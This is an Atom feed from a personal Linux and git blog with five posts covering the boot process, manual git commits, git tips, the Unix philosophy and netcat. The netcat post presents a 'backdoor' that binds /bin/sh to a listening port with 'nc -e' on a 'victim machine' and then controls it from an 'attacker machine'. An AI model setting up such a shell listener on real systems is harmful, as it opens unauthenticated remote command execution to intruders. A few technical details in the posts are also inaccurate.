<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: GNU/Linux | Beat of The Geek]]></title>
  <link href="http://\.github.io/\/github/blog/categories/gnu-slash-linux/atom.xml" rel="self"/>
  <link href="http://\.github.io/\/github/"/>
  <updated>2015-12-07T10:12:02+05:30</updated>
  <id>http://\.github.io/\/github/</id>
  <author>
    <name><![CDATA[Charanjit Singh]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA["To know me better, try walk in my boots", said GNU/Linux]]></title>
    <link href="http://\.github.io/\/github/2014/01/linux-boot-process-real-quick-walkthrough.html"/>
    <updated>2014-01-12T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2014/01/linux-boot-process-real-quick-walkthrough</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on"><h2 style="text-align: left;">A quick go through to the GNU/Linux boot process</h2>This post talks (quickly) about how a typical Linux (PC) system boots. I'll try avoiding much technical terms. It'll be a quick walk without diving much deeper.<br /><br />The booting process of a system involves several steps. <br />When the computer first powers up, the code in its ROM is executed. This code generally called the firmware has some knowledge of the system hardware. On PCs this initial boot code is generally called the <b>BIOS (Basic Input/Output System)</b>. A PC can have several BIOS levels for machine itself, graphic cards, network cards etc. In the context of booting, the BIOS generally perform two operations:<br /><ul style="text-align: left;"><li>It figures out which device to boot from</li><li>And loads a program from the bootable sector from bootable device which tell the secondary boot loader to load<!-- more --></li></ul><h4 style="text-align: left;">The MBR loading process then takes place. </h4>MBR is the boot sector on hard disks. <b>MBR(Master Boot recorder)</b> is the first sector on the disk which have details about<br /><ul style="text-align: left;"><li>Primary boot loader code(This is of 446 Bytes)<br />The first 446 bytes of MBR contain the code that locates the partition to boot from. The rest of booting process takes place from that partition. This partition contains a software program for booting the system called the ‘bootloader’.</li><li>Partition table information(64 Bytes)<br />MBR contains 64 bytes of data which stores Partition table information such as <br />- what is the start and end of each partition<br />- size of partition<br />- type of partition(Whether it's a primary or extended etc)<br />It requires 16 Bytes of space for one partition. So at most we get 4 primary partitions.</li><li>Magic number(2 Bytes)<br />The magic number service as validation check for MBR. If MBR gets corrupted this magic number is used to retrieve it.</li></ul><h4 style="text-align: left;">GRUB loading</h4><div style="text-align: left;"><b>GRand Unified Bootloader</b> is the boot loader for most Linux distributions. Its job is to load a kernel from a pre-prepared list of kernels with options specified. The GRUB has two versions<br />- GRUB legacy<br />- GRUB 2</div><div style="text-align: left;"><br />GRUB works in stages.<br />Stage 1 is located in the MBR and mainly points to Stage 2, since the MBR is too small to contain all of the needed data.<br />Stage 2 points to its configuration file, which contains all of the complex user interface and options we are normally familiar with when talking about GRUB. Stage 2 can be located anywhere on the disk. If Stage 2 cannot find its configuration table, GRUB will cease the boot sequence and present the user with a command line for manual configuration.<br />Stage 1.5 also exists and might be used if the boot information is small enough to fit in the area immediately after MBR.<br /><br />GRUB 2 has replaced the first version of GRUB which is hence now called GRUB Legacy. GRUB 2 has better portability and modularity, supports non-ASCII characters, dynamic loading of modules, real memory management, and more.&nbsp;</div><h4 style="text-align: left;">Kernel initialization</h4><div style="text-align: left;">The kernel itself is a program which on Linux is usually located as some variant of '/boot/vmlinuz'. On my system it is </div><blockquote class="tr_bq">/boot/vmlinuz-linux</blockquote><div style="text-align: left;">After the kernel is loaded it probes the system for how much RAM is available. It reserves some memory for itself for its own statically sized data structures. Then the kernel probes for what hardware is present and for loading device drivers.&nbsp; Mostly kernel loads device drivers as independent kernel modules so a small Linux kernel can support a large number of hardware devices. Different GNU/Linux distributions can come with different driver modules bundled with the kernel.<br />After basic initialization the kernel creates several "spontaneous" processes. They are called spontaneous because they are not started in user space with regular 'fork'&nbsp; mechanism. we can see the processes with </div><blockquote class="tr_bq">ps -A</blockquote><div style="text-align: left;">Most system started process have low PIDs. Process with PID 0 is the init system.</div><h4 style="text-align: left;">Init process</h4><div style="text-align: left;">init is the first process to run and always has PID 1. Different systems may have different implementations of init e.g last time I used Ubuntu, it was using 'upstart'. We can check the init system on our machine with</div><blockquote>=&gt; ps -A | head -n 2 <br />=&gt; PID TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TIME CMD<br />&nbsp;&nbsp;&nbsp; 1&nbsp; ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00:00:00 systemd</blockquote><div style="text-align: left;">Init script is generally '/sbin/init' which can be a symbolic link to the init daemon</div><blockquote class="tr_bq">=&gt; file /sbin/init<br />=&gt; /sbin/init: symbolic link to `../usr/lib/systemd/systemd'</blockquote><div style="text-align: left;">Some commonly performed tasks by these scripts are<br />- settings the name of the computer<br />- setting the time zone<br />- checking disks with 'fsck'<br />- mounting the system's disks<br />- removing old files from '/tmp'<br />- configuring network interfaces<br />- starting up daemons and network services<br />&nbsp;</div><div style="text-align: left;">init have a concept of run&nbsp; levels. Different init systems may use different terms for run levels (e.g systemd call 'em targets). But the purpose is similar in most cases.</div><div style="text-align: left;">init defines at least seven run levels each of which represents a particular complement of services that the system should be running. Exact definitions may vary among systems but general points are<br />- at level 0, system is completely shut down<br />- level 1 represents single user mode<br />- level 2 to 5 include support for networking<br />- level 6 is 'reboot' <br />The number of levels on different systems vary, as their names. The system is now booted, and proceeds depending on the run level it's been set for.</div><div style="text-align: left;"></div><div style="text-align: left;">You can get more information about the <a href="http://www.tldp.org/LDP/sag/html/run-levels-intro.html#RUN-LEVELS-TABLE" target="_blank">run levels here</a>. For an excerpt</div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;"><br />0 - Halt the system.</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">1 - Single-user mode (for special administration).</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">2 - Local Multiuser with Networking but without network service (like NFS)</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">3 - Full Multiuser with Networking</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">4 - Not Used</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">5 - Full Multiuser with Networking and X Windows(GUI)</span></div><div style="text-align: left;"><span style="font-family: Times,&quot;Times New Roman&quot;,serif;">6 - Reboot.</span></div></div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[git commit illustrated: Simplicity revealed by a complex exercise for simplest git task]]></title>
    <link href="http://\.github.io/\/github/2014/01/git-commit-illustrated-simplicity.html"/>
    <updated>2014-01-10T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2014/01/git-commit-illustrated-simplicity</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-2hJwSV2bj7I/Us-k_1d6bnI/AAAAAAAAAlQ/FplZr00hLCk/s1600/46.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-2hJwSV2bj7I/Us-k_1d6bnI/AAAAAAAAAlQ/FplZr00hLCk/s1600/46.png" height="236" width="400" /></a></div>In this post I will try to explain the underlying commands and to a level the internal working of the git system involved when making a 'commit'.<br />This post is actually the by-product of my research for another post about git (.git/ actually).  I was so much astonished by the amount of myths about complexity of git system removed from my mind, that I decided to make it the today's post itself. To me the git system appears much simple now than yesterday.<br /><h3 style="text-align: left;">Commit </h3>Commit is the central piece of the git system. The git world is simply a collection of commit objects, each of which hold a tree, which hold references to other trees and blobs. The branches, the tags, the HEAD are just fancy aliases for commits (more on these in some other post (next may be)).<br />A commit is basically the snapshot of present working tree. I will spare the details  for a future post (it's worth it).<br /><br />Let's now discuss what this post is about. Revealing the secrets involved in every git users ritual of 'commit'ing, and performing a commit manually.<br /><br /><!-- more -->This should reveal quite some details about the internal working of git (no you don't need to run away, it's not that deep).<br /><br />You might already know the concepts, but knowing sex and having sex are kind of different things.<br /><br />Ok! Let's start the <b>exercise for manual commit</b>.<br /><br />First we need to create an empty directory, call it 'work'. And some simple file in it.<br /><blockquote class="tr_bq">=&gt; mkdir work<br />=&gt; echo "Hello world!" &gt; hello_world</blockquote>Initiate a git repo in it and add the 'hello_world' file<br /><blockquote class="tr_bq">=&gt; git init</blockquote>We will keep an eye on the changes that happen in the '.git' repo throughout our exercise. For now check out what's saved in the HEAD.<br /><blockquote class="tr_bq">=&gt; cat .git/HEAD<br />=&gt; ref: refs/heads/master</blockquote>As HEAD is basically just a reference to the commit which represents the current commit associated with the working tree. So one might guess .git/refs/heads/master would point to the tip of a branch. Let's check it <br /><blockquote class="tr_bq">=&gt; ls .git/refs/heads/master<br />=&gt; <br />=&gt; git branch<br />=&gt;</blockquote>There is nothing in there. Since we have not committed any commits yet, there are no branches (since branches are merely named commits which happen to have multiple child commits).<br />If you are feeling adventurous, you can try 'git log'.<br /><blockquote class="tr_bq">=&gt; git log<br />=&gt; fatal: bad default revision 'HEAD'</blockquote>Let's now <b>add our file to the staging area</b><br /><blockquote class="tr_bq">=&gt; git add hello_world</blockquote><blockquote class="tr_bq"><b>Staging area is the middle system which keeps our content after 'git add' and before 'git commit'</b></blockquote><blockquote class="tr_bq">&nbsp;<b>A blob is the git's representation of a file. It's not actually a file, but just the content. A blob do not have any name or other metadata. It's referenced in trees which contain metadata for blobs.<br />Tree is the object which stores references to other trees and blobs as leaf nodes.</b></blockquote>This command converted content of 'hello_world' file into a blob and placed it in the index (aka staging area). A 'blob' is how our content is represented in git. You can check the .git dir, a new file 'index' is created. This file contain the references to all blobs and trees which get added to our staging area.<br /><blockquote class="tr_bq">=&gt; ls .git<br />=&gt; branches&nbsp; config&nbsp; description&nbsp; HEAD&nbsp; hooks *index*&nbsp; info&nbsp; objects&nbsp; refs</blockquote>At this point we would generally just 'commit' the 'index', but not this time. The 'git commit' command hides many details and is a great convenience. You'll value it after this exercise.<br /><br />Git store all our content in form of blobs. The blobs do not have any kind of meta-data attached with them (like name, creation date or something). They are just nameless 'blobs'. To identify a blob, they are saved in 'trees' as leaf nodes. Different trees can save reference to same blob with different meta-data attached. But a git repository will have exactly one copy of a blob. This is the reason of compact storage of git.<br /><br />We can see the blob for our content in 'hello world' present in staging area (index)<br /><blockquote class="tr_bq">=&gt; git ls-files --stage<br />=&gt; 100644 802992c4220de19a90767f3000a79a31b98d0df7 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hello_world</blockquote>If you entered the same content as me, both your and my hashes should be same. We can check what type of object the above hash belong to<br /><blockquote class="tr_bq">=&gt; git cat-file -t 802992c<br />=&gt; blob</blockquote>The above blob is not referenced by any tree. It's only referenced from .git/index (which store references to objects (blobs and trees) which make up our staging area).<br />&nbsp;A 'commit' object in git holds a single tree. A tree may have references to more trees or blobs. So to 'commit' the above created blob of our content, we need a tree. <br /><br />So we now need to create a tree. <br /><blockquote class="tr_bq">=&gt; git write-tree<br />=&gt; cdbf8e1f00e97366e01cbf2d73f3689a60107686</blockquote>'write-tree' command make a tree with the contents of the 'index'.<br />Now when we have the tree, let's create a commit object with it.<br /><blockquote class="tr_bq">=&gt; echo "Initial commit" | git commit-tree cdbf8e1<br />=&gt; a5a86835ba72e3ca7d5267c68c06c212392f9b7d</blockquote>That's the hash for our commit object. You directly use 'git commit <tree-hash>'. Then the command will wait for the commit message to be entered and 'ctrl-d' for proceeding.</tree-hash><br /><br />So our commit object is ready, and we are done. Right? Not actually. What we have created is called an 'unreachable commit'. <br /><b>An unreachable commit</b> is a commit which do not have any parents and which is not referenced by any of the files in .git/refs/heads/. Such commits are automatically removed by the git system after some time.<br />&nbsp;To make our commit reachable, we need to create a reference in a file in .git/refs/heads. <br /><blockquote class="tr_bq">=&gt; echo a5a86835ba72e3ca7d5267c68c06c212392f9b7d &gt; .git/refs/heads/hello</blockquote>Actually we should instead use the more safe way to update references in git system.<br /><blockquote class="tr_bq">=&gt; git update-refs refs/head/hello a5a86835ba72e3ca7d5267c68c06c212392f9b7d</blockquote>Here if we had used name 'master' instead of 'hello', we could have used 'git log'. But now it's still giving 'fatal:' because the HEAD is referring to 'refs/heads/master' which does not exist.<br /><br />Now try the command 'git branch'.<br /><blockquote class="tr_bq">=&gt; git branch <br />=&gt; hello</blockquote>Here we see what a branch actually is to git. A reference to a 'commit' object.<br />Wait there is more to it. Now when we have created the branch 'hello', we need to make HEAD refer to it. <br /><blockquote class="tr_bq">=&gt; git symbolic-ref HEAD refs/heads/hello</blockquote>This command associated our working tree with the newly created branch/commit of ours. This is what actually happens on a checkout normally.<br />Now we can use 'git log'. If you are using 'zsh' with appropriate theme, at this point the git branch indicator will change form uncommitted 'master' to committed 'hello'.<br /><br />Now we are done. Officially. Git system is this frighteningly simple inside. Hope this was as helpful for you as it was for me. I really enjoyed writing this post.</div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[5 cool things to do with `netcat']]></title>
    <link href="http://\.github.io/\/github/2014/01/5-cool-things-to-do-with-netcat.html"/>
    <updated>2014-01-09T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2014/01/5-cool-things-to-do-with-netcat</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-RJa66jJ6HHI/Us41fwVnz9I/AAAAAAAAAlA/WYM1w7SnfGE/s1600/46.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="236" src="http://4.bp.blogspot.com/-RJa66jJ6HHI/Us41fwVnz9I/AAAAAAAAAlA/WYM1w7SnfGE/s1600/46.png" width="400" /></a></div>I heard somewhere about 'netcat' being the swiss-army-knife for networking. Looking through its man pages I tried many commands as I could understand them, but still remained unimpressed. But so many wise people calling netcat 'the awesome' can't be wrong, right! So I went through lengths and surfed&nbsp; the Internets, grep'd some ebooks on networking, re-read its man pages and forced myself to get impressed. <br />Here is a list of cool things I could figure out to be done with netcat. I am sure there are more my puny brain couldn't discover. Hugs and kisses for all (females) who will tell 'em in comments.<br /><!-- more --><br /><h2 style="text-align: left;">Banner grabbing / Displaying user-agent for the request</h2><blockquote class="tr_bq">&nbsp;netcat -lp 6969</blockquote>So basically netcat is 'cat' for the net(work). It directly reads and writes data over the network. Sounds good for peeking at 'HTTP' headers? To me at least. This is the only thing I use netcat for on daily basis. Many of my tasks involve making crawlers, and netcat is the first tool I use for exploring how my crawlers behave to servers.<br />Most of the times I am interested in inspecting the 'User Agent' header, but above command dumps a lot more information about the HTTP headers.<br />Here's an excerpt:<br /><blockquote class="tr_bq">GET / HTTP/1.1<br />Host: 127.0.0.1:9999<br />Accept-Language: en<br />Accept-Encoding: x-gzip,gzip,deflate<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />User-Agent: Scrapy/0.20.0 (+http://scrapy.org)</blockquote><h2 style="text-align: left;">Using netcat as a port scanner</h2><blockquote class="tr_bq">nc -zp 9090 localhost 8000-9000 -v</blockquote>Netcat can help in finding out the open ports on our machine. Yes and yes. There are better tools available for this job and they are more efficient. I can't guess why to nc for this. May be because it can be used like this, or because netcat is installed by default on most machines and nmap is not.<br />Here's an excerpt when a 'twisted' http server was running on my machine.<br /><blockquote class="tr_bq">localhost [127.0.0.1] 8080 (http-alt) open</blockquote><h2>Netcat as a simple local network backdoor</h2>This is another one of my favorites. Making backdoors was never this simple. Although this only worked on local network, but it's kind of cool. I think with little more effort this can be made to work from outside the LAN as well, may with tunneling (nc -L) or something. I am too tired to do any more research. Please enlighten me if you can do it. Here's how I did it on my LAN.<br /><h4 style="text-align: left;">On victim machine run</h4><blockquote class="tr_bq">&nbsp;nc -e "/bin/sh" 127.0.0.1 -lp 8080</blockquote>'nc -e' executes any program on the local machine. I tried running python and ruby scripts, and even installing software with 'pacman' by running similar command on one machine and then making a request with 'curl' and even with firefox from other machine.<br /><h4 style="text-align: left;">On attacker machine send commands with</h4><blockquote class="tr_bq">nc <command></command><command></command><br />e.g nc ls -a</blockquote>This will run a session in which a command is executed and its stdout shown. Here's an excerpt from one of those I tried.<br /><br /><blockquote class="tr_bq">nc 127.0.0.1 8080</blockquote><blockquote>echo $SHELL<br />/bin/zsh<br />whoami<br />channi<br />pwd&nbsp; <br />/home/channi<br />ls /media/<br />E<br />F<br />cd /media/E<br />pwd<br />/media/E<br />ls<br />e Books<br />Games<br />Images<br />Movies<br />Music</blockquote><h2 style="text-align: left;">Using netcat as a single request web server</h2><blockquote class="tr_bq">{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <some -l="" -p="" .file="" 8080="" br="" cat="" n="" nc="" r="" some.file=""></some></blockquote>You don't need to be a $BASH wiz to understand this one. It simply outputs the basic HTTP headers and calculated content length of a file to the netcat which then listens on port 8080. It gets served to whoever reaches localhost:8080 first. Yup! First come first serve. This server works for a single request only, and I din't try it over the Internet.&nbsp; <br /><h2 style="text-align: left;">Using netcat as a listener</h2><blockquote class="tr_bq">cat afile.txt | nc 127.0.0.1 9999<br />nc -l 127.0.0.1 9999 &gt; log.txt</blockquote>Netcat can be used as a listener (as it is being used in first point) and stuff can be sent over network as in commands above. The second command must be run on a recipient machine and first from sender machine. A file can be sent this way. <br /><br />Yes I din't properly research for this post. I don't like writing half-assed posts but I have to stay with my new-year resolution of writing a-post-a-day. All the enlightened souls please bless me with your wisdom in comments. Specially anything about making nc persist multiple requests without scripting it with bash, python or anything.</div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[5 things I frequently do and forget with git]]></title>
    <link href="http://\.github.io/\/github/2014/01/5-things-i-frequently-do-and-forget.html"/>
    <updated>2014-01-08T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2014/01/5-things-i-frequently-do-and-forget</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on">Here are few things I used to do a lot in my starting days with git and then forgot to re-search them when needed next time. These tips are from my notes. <br /><br /><h3 style="text-align: left;">How to undo the last Git commit?</h3>There are two scenarios in this case, and hence two ways to achieve our goal.<br /><h4 style="text-align: left;">Hard Reset - Completely undo the last commit and all the changes it made.</h4><blockquote class="tr_bq">git reset --hard HEAD~1</blockquote>Imagine the state of the tree is as following:<br /><br /><blockquote>&nbsp;&nbsp; (F)<br />A-B-C<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ↑<br />&nbsp; master</blockquote><br /><!-- more --><br /><br />where (F) is the current state of files and 'C' is the commit we want to undo. The above command completely removes the last commit along with all the changes involved in the commit. The new state of the tree is like this:<br /><br /><blockquote class="tr_bq">&nbsp;(F)<br />A-B<br />&nbsp;&nbsp;&nbsp; ↑<br />master</blockquote><br /><br /><blockquote class="tr_bq"><b>What is HEAD?</b><br />We can think of the HEAD as the "current branch". HEAD is basically a pointer which points to the latest commit. When we switch branches with git checkout, the HEAD revision changes to point to the tip of the new branch.</blockquote><blockquote class="tr_bq"><b>What is HEAD~1?</b><br />It's kind of complicated to explain HEAD~1 without explaining HEAD^1.<br />HEAD^1&nbsp; means the first parent of the commit object. ^<n> means the <n>th parent.<br />HEAD~1 means the commit object that is the first generation grand-parent of the named commit object, following only the first parents. e.g <rev>~3 is equivalent to <rev>^^^ which is equivalent to <rev>^1^1^1.</rev></rev></rev></n></n></blockquote><h4 style="text-align: left;">Undo the commit but keep the changes</h4><blockquote class="tr_bq">git reset HEAD~1</blockquote>If we want to undo the last commit for some reason (like if we entered the wrong commit message or the commit was incomplete), we can use a soft reset on HEAD.<br />In this case, the tree structure changes to something like:<br /><br /><blockquote>&nbsp;&nbsp; (F)<br />A-B-C<br />&nbsp;&nbsp; ↑<br />master</blockquote><br /><b>What's happening?</b><br />In both cases, HEAD is just a pointer to the latest commit. When we do a git reset HEAD~1, we tell Git to move the HEAD pointer back one commit. But (unless we use --hard) we leave your files as they were. So now git status shows the changes you had checked into C. You haven't lost a thing!<br /><h3 style="text-align: left;">How to change the commit message of last commit</h3><blockquote class="tr_bq">git reset --soft HEAD~1</blockquote>Using this command we undo the last commit but keep the files as well as the index untouched. This means we can just recommit with no extra effort as a new commit with a new commit message.<br /><br /><b>What's happening here?</b><br />Same as first point. But it leaves the files as well as the index unchanged, so we just need to 'commit' again with a new commit message.<br /><h3 style="text-align: left;">How to get a commit back after 'reset --hard'</h3>In the first point, we undid the previous commit permanently(?). Sometimes (read often) it happens that we need the destroyed commit back. Following commands can be used to resurrect the destroyed commit.<br /><blockquote class="tr_bq">git reflog </blockquote>This command shows a list of partial commit shas. We need to choose the commit we want to restore from this list and use following command.<br /><blockquote class="tr_bq">git checkout -b someNewBranchName shaOfDestroyedCommit</blockquote>This will create a new branch and restore the destroyed commit in it, which we can re-merge as required.<br /><br /><b>What's happening here?</b><br />Commits don't actually get destroyed in git for about 90 days. So usually we can go back and restore commits with method explained above.<br /><h3 style="text-align: left;">How to remove a git submodule?</h3><blockquote class="tr_bq">Git submodule?</blockquote>Submodules allow foreign repositories to be embedded within a dedicated subdirectory of the source tree, always pointed at a particular commit. Submodules are meant for different projects you would like to make part of your source tree, while the history of the two projects still stays completely independent and you cannot modify the contents of the submodule from within the main project.<br /><h4 style="text-align: left;">Removing a git submodule</h4>Git submodules can simply be removed with 'git rm', but that keeps the submodule entry intact in the .git/config and .gitmodules. There is actually an easier way to remove submodules with a single command.<br /><blockquote class="tr_bq">git submodule deinit <submodule name=""><br /></submodule></blockquote>This is in comprehension to 'git submodule init' command and does all the submodule removal work itself.<br /><h3 style="text-align: left;">How to delete a remote git branch?</h3>&nbsp;This one is easy. We just need one command to delete a remote branch.<br /><blockquote class="tr_bq">git push origin --delete <branchname><br /></branchname></blockquote>To remove a local branch, we can of course use<br /><blockquote class="tr_bq">git branch -d <localbranch><br /></localbranch></blockquote><br /></div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Yet another post about the unix philosophy]]></title>
    <link href="http://\.github.io/\/github/2013/12/yet-another-post-about-unix-philosophy.html"/>
    <updated>2013-12-22T00:00:00+05:30</updated>
    <id>http://\.github.io/\/github/2013/12/yet-another-post-about-unix-philosophy</id>
    <content type="html"><![CDATA[<div class='post'>
<div dir="ltr" style="text-align: left;" trbidi="on"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://izquotes.com/quotes-pictures/quote-the-unix-philosophy-basically-involves-giving-you-just-enough-rope-to-hang-yourself-and-then-a-anonymous-293194.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="150" src="http://izquotes.com/quotes-pictures/quote-the-unix-philosophy-basically-involves-giving-you-just-enough-rope-to-hang-yourself-and-then-a-anonymous-293194.jpg" width="320" /></a></div>I have a recently started a minor Linux Users Group with some people in my locality. One question that I've been answering frequently is 'what is this "unix philosophy"?<br />Am writing this post as a quick answer for this question.<br /><br /><b>Some history of the unix philosophy</b><br /><br />Unix philosophy or the unix tools philosophy emerged when the UNIX operating system was created. Or to be more precise, when the pipes '|' were invented. The pipes allow output from one command to be sent to another command as input.<br />e.g <br /><blockquote class="tr_bq">ps -A | grep firefox</blockquote>The output from the ps command, list of all running applications is passed to the 'grep' utility which searches for the line having the word 'firefox', and prints it. Pipes are really handy. Really.<br /><br />The philosophy lead by this invention was to create small tools which would do a particular job&nbsp; instead of creating big programs that do many things.<br />For example tools like grep, or wc. They exist for one and only one task (searching and counting).<br /><br />These small tools could then be used together with the help of pipes to accomplish more complex tasks.<br /><br />It was revolutionary. This philosophy avoided programmers from re-creating small subsystems of their software which could now be replaced by a small tool invented by someone else.<br /><br />So this why <b>the philosophy says</b><br /><blockquote class="tr_bq">'Do one thing, and do it perfectly well'</blockquote></div></div>

]]></content>
  </entry>
  
</feed>
